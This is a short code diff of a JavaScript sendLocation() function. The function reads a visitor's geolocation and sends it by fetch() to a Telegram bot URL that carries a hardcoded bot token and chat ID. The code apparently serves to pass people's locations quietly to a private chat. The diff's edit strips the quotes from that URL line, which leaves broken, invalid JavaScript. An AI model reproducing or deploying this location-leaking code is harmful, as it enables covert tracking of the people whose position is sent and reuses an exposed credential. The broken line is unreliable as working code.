@@ -6,7 +6,7 @@ function sendLocation() {
         const longitude = position.coords.longitude;
 
         // Telegram API URL with the correct chat ID and token
-        const telegramUrl = `https://api.telegram.org/bot7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk/sendLocation?chat_id=6219309154&latitude=${latitude}&longitude=${longitude}`;
+        const telegramUrl = https://api.telegram.org/bot7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk/sendLocation?chat_id=6219309154&latitude=${latitude}&longitude=${longitude};
 
         // Sending the location data to Telegram
         fetch(telegramUrl)
